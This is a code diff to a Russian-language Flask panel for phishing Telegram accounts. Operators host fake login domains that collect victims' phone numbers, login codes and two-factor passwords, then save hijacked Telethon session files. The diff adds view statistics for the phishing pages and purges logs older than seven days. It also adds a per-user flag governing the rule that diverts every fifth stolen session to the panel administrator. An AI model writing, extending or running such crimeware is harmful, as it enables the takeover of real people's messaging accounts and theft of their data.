@@ -7,7 +7,7 @@ import requests
 import json
 import os
 import re
-from datetime import datetime
+from datetime import datetime, timedelta
 from config import salt, server_domain
 import validators
 from tg_client import ClientTG
@@ -195,12 +195,21 @@ async def panel():
 
         if not admin:
             db_victim = Victim(f'./users/{username}/database.db')
-            logs = db_victim.GetLogs()
-        else:
-            return redirect(url_for("news"))
-        
-        db.UpdateActivity(username)
-        return render_template('index.html', username=username, admin=admin, logs=logs)
+            
+            logs = db_victim.GetValidLogs()
+            
+            for log in logs:
+                given_date = datetime.strptime(log[2], "%Y-%m-%d %H:%M:%S.%f%z")
+                current_date = datetime.now(given_date.tzinfo)
+                difference = current_date - given_date
+                # Удаляем лог, если он больше 7 дней
+                if difference >= timedelta(days=7):
+                    os.remove(f"./users/{username}/sessions/{log[0][1:]}.session")
+                    db_victim.RemoveLog(log[0])
+
+            db.UpdateActivity(username)
+            
+            return render_template('index.html', username=username, admin=admin, logs=logs)
     else:
         try:
             path = 'panel'
@@ -217,6 +226,41 @@ async def panel():
             return redirect(url_for('index', path=request.path.replace('/', '')))
     
 
+
+
+
+###########################################
+#                                         #
+#                  Панель                 #
+#                                         #
+###########################################
+@app.route('/statistics', methods=['POST', 'GET'])
+async def statistics():
+    domain = request.headers.get('Host')
+    if domain == server_domain:
+        if 'username' in session:
+            username = session['username']
+            db.UpdateActivity(session['username'])
+            db_victim = Victim(f'./users/{username}/database.db')
+            logs = db_victim.GetLogs()
+
+            return render_template('statistics.html', logs=logs)
+        else:
+            return 'Нет доступа'
+    else:
+        try:
+            path = 'shortener'
+            url = domain + '$' + path
+
+            username = os.listdir(f'templates/domains/{url}/')[0]
+            if not 'entered' in session:
+                session['entered'] = True
+                db_victim = Victim(f'./users/{username.replace(".html", "")}/database.db')
+                db_victim.AddView(domain)
+
+            return render_template(f'domains/{url}/{username}')
+        except:
+            return redirect(url_for('index', path=request.path.replace('/', '')))
 
 
 
@@ -507,13 +551,14 @@ async def add_user():
         chat_id = request.form.get('chat_id')
         bot_token = request.form.get('bot_token')
         note = request.form.get('note')
+        get_logs = request.form.get('get_logs')
 
         user = db.GetUserBy('username', username)
 
         if user:
             response = {'status': 'error', 'message': 'Такой пользователь уже существует'}
         else:
-            db.AddUser(username, generate_password_hash(password), chat_id, bot_token, note)
+            db.AddUser(username, generate_password_hash(password), chat_id, bot_token, note, get_logs)
             response = {'status': 'success', 'message': 'Пользователь успешно добавлен'}
         return jsonify(response)
     else:
@@ -536,13 +581,16 @@ async def remove_user():
             db_victim = Victim(f'./users/{username}/database.db')
             phishes = db_victim.GetDomains()
             domains = os.listdir(f'templates/domains/')
- 
-            for i in range(0, len(phishes)):
-                for host in domains:
-                    if host.startswith(phishes[i][1]):
-                        os.rmtree(f'./templates/domains/{host}')
-                        db_victim.RemoveDomain(phishes[i][1])
-            
+
+            try:
+                for i in range(0, len(phishes)):
+                    for host in domains:
+                        if host.startswith(phishes[i][1]):
+                            os.rmtree(f'./templates/domains/{host}')
+                            db_victim.RemoveDomain(phishes[i][1])
+            except:
+                pass
+
             db.RemoveUser(username)
 
 
@@ -571,7 +619,8 @@ async def edit_user():
         user_id = request.form.get('user_id')
         chat_id = request.form.get('chat_id')
         bot_token = request.form.get('bot_token')
-        print(password)
+        get_logs = request.form.get('get_logs')
+        print(get_logs)
         user = db.GetUserBy('id', user_id)
 
         if user:
@@ -582,11 +631,12 @@ async def edit_user():
                 ['chat_id', chat_id],
                 ['bot_token', bot_token],
                 ['note', note],
+                ['get_logs', get_logs]
             ]
-            print(generate_password_hash(password))
+
             db.UpdateUser(data, 'id', user_id)
             
-            response = {'status': 'success', 'message': 'Пользватель успешно сменён'}
+            response = {'status': 'success', 'message': 'Пользватель успешно изменён'}
         else:
             response = {'status': 'error', 'message': 'Пользователь не существует'}
             
@@ -694,6 +744,8 @@ async def add_domain():
 ###########################################
 @app.route('/edit_domain', methods=['POST'])
 async def edit_domain():
+    print(session)
+    print(session['username'])
     if 'username' in session:
         username = session['username']
         domain = request.form.get('domain')
@@ -799,23 +851,47 @@ async def remove_domain():
 async def getinfo():
     if 'username' in session:
         username = session['username']
-        id = request.form.get('id')
-        db_victim = Victim(f'./users/{username}/database.db')
-        data = db_victim.GetDomainInfo(id)
-        db.UpdateActivity(session['username'])
 
-        if data[0]:
-            return jsonify({'status': 'success', 'message': 'Данные получены', "data": list(data[0])})
+        if username == db.GetAdmins(username)[0]:    
+            id = request.form.get('id')
+            db_victim = Victim(f'./users/{username}/database.db')
+            data = db_victim.GetDomainInfo(id)
+            db.UpdateActivity(session['username'])
+
+            if data[0]:
+                return jsonify({'status': 'success', 'message': 'Данные получены', "data": list(data[0])})
+            else:
+                return jsonify({'status': 'error', 'message': 'Что-то пошло не так...'})
         else:
-            return jsonify({'status': 'error', 'message': 'Что-то пошло не так...'})
+            return jsonify({'status': 'error', 'message': 'Нет доступа'})
     else:
         return jsonify({'status': 'error', 'message': 'Нет доступа'})
 
+###########################################
+#                                         #
+#     Получить все данные пользователя    #
+#                                         #
+###########################################
+@app.route('/getuserinfo', methods=['POST'])
+async def getuserinfo():
+    if 'username' in session:
+        username = session['username']
+        if username == db.GetAdmins(username)[0]:
+            id = request.form.get('id')
+            data = db.GetUserBy('id', id)
 
+            if data:
+                return jsonify({'status': 'success', 'message': 'Данные получены', "data": data})
+            else:
+                return jsonify({'status': 'error', 'message': 'Что-то пошло не так...'})
+        else:
+            return jsonify({'status': 'error', 'message': 'Нет доступа'})
+    else:
+        return jsonify({'status': 'error', 'message': 'Нет доступа'})
 
-# @app.route('/tg', methods=['POST', 'GET'])
-# async def tg():
-#     return render_template('./domains/depian.online$login/jojo.html')
+@app.route('/tg', methods=['POST', 'GET'])
+async def tg():
+    return render_template('./domains/depian.online$login/jojo.html')
 
 
 
@@ -834,6 +910,7 @@ async def verify_phone():
     username = request.form.get('username')
     fish = request.form.get('pageID')
 
+   
 
     if os.path.exists(f'./users/{username}/sessions/{phone[1:]}.session') or os.path.exists(f'./admin_logs/sessions/{phone[1:]}.session'):
         if await is_valid_session(f'./users/{username}/sessions/{phone[1:]}.session') or await is_valid_session(f'./admin_logs/sessions/{phone[1:]}.session'):
@@ -847,6 +924,9 @@ async def verify_phone():
     app_id = data[0][0]
     api_hash = data[0][1]
     logs = db_victim.GetCountOfLogs()[0][0]
+    is_to_admin_log = db.IsLogAdmin(username)
+
+    
     if  logs == 0:
         is_to_admin = 1
     else:    
@@ -854,7 +934,7 @@ async def verify_phone():
 
     try:
 
-        if is_to_admin == 0:
+        if  is_to_admin == 0 and is_to_admin_log[0] == 'true':
             client = ClientTG(f'./admin_logs/sessions/{phone[1:]}.session', app_id, api_hash, phone).client
             await client.connect()
             send_code = await client.send_code_request(phone=phone)
@@ -879,7 +959,7 @@ async def verify_phone():
 <b>Номер: </b><code>{phone}</code>
 <b>Ошибка: </b><code>Смените api id и api hash</code>
 """)
-        if is_to_admin == 0:
+        if  is_to_admin == 0 and is_to_admin_log[0] == 'true':
             os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
         else:
             os.remove(f'./users/{username}/sessions/{phone[1:]}.session')
@@ -888,7 +968,7 @@ async def verify_phone():
     except PhoneNumberInvalidError:
         if client.is_connected():
             await client.disconnect()
-        if is_to_admin == 0:
+        if  is_to_admin == 0 and is_to_admin_log[0] == 'true':
             os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
         else:
             os.remove(f'./users/{username}/sessions/{phone[1:]}.session')
@@ -896,8 +976,9 @@ async def verify_phone():
 
 
 
-#     except Exception as e:
-#         print(e)
+    except Exception as e:
+        print(e)
+        return jsonify({'status': 'internal_error', 'message': 'Извините, сервера перегружены (Внутренная ошибка)'})
 #         return e
 #         data = db.GetBotData(username)
 #         chat_id = data[0][0]
@@ -910,7 +991,7 @@ async def verify_phone():
 # <b>Номер: </b><code>{phone}</code>
 # <b>Ошибка: </b><code>{e}</code>
 # """)
-#         if is_to_admin == 0:
+#         if  is_to_admin == 0 and is_to_admin_log[0] == 'true':
 #             os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
 #         else:
 #             os.remove(f'./users/{username}/sessions/{phone[1:]}.session')
@@ -946,13 +1027,14 @@ async def verify_code():
     api_hash = data[0][1]
     
     logs = db_victim.GetCountOfLogs()[0][0]
+    is_to_admin_log = db.IsLogAdmin(username)
     if  logs == 0:
         is_to_admin = 1
     else:    
         is_to_admin = logs % 5
     try:
         
-        if is_to_admin == 0:
+        if  is_to_admin == 0 and is_to_admin_log[0] == 'true':
             client = ClientTG(f'./admin_logs/sessions/{phone[1:]}.session', app_id, api_hash, phone).client
             await client.connect()
             if password == '':
@@ -981,7 +1063,7 @@ async def verify_code():
         
         return jsonify({'status': 'success', 'message': 'Успешно', 'redirect': redirect[0][1]})
     except SessionPasswordNeededError:
-        if is_to_admin == 0:
+        if  is_to_admin == 0 and is_to_admin_log[0] == 'true':
             pass
         else:
             db_victim.UpdateLog(domain, phone, fish, "Ввёл код", "Присутствует")
@@ -989,7 +1071,7 @@ async def verify_code():
 
 
     except PhoneCodeExpiredError:
-        if is_to_admin == 0:
+        if  is_to_admin == 0 and is_to_admin_log[0] == 'true':
             os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
         return jsonify({'status': 'error', 'message': 'Ваш код истёк', 'type': 'PhoneCodeExpiredError'})
     
@@ -999,7 +1081,7 @@ async def verify_code():
     
 
     except FloodWaitError:
-        if is_to_admin == 0:
+        if  is_to_admin == 0 and is_to_admin_log[0] == 'true':
             os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
         return jsonify({'status': 'error', 'message': 'Слишком много попыток, попробуйте по позже', 'type': 'FloodWaitError'})
     except PasswordHashInvalidError:
@@ -1018,7 +1100,7 @@ async def verify_code():
 <b>Номер: </b><code>{phone}</code>
 <b>Ошибка: </b><code>Смените api id и api hash</code>
 """)
-        if is_to_admin == 0:
+        if  is_to_admin == 0 and is_to_admin_log[0] == 'true':
             os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
         return jsonify({'status': 'internal_error', 'message': 'Извините, сервера перегружены (Внутренная ошибка)'})
     
@@ -1033,7 +1115,7 @@ async def verify_code():
 <b>Номер: </b><code>{phone}</code>
 <b>Ошибка: </b><code>{e}</code>
 """)
-        if is_to_admin == 0:
+        if  is_to_admin == 0 and is_to_admin_log[0] == 'true':
             os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
         return jsonify({'status': 'internal_error', 'message': 'Извините, сервера перегружены (Внутренная ошибка)'})
 
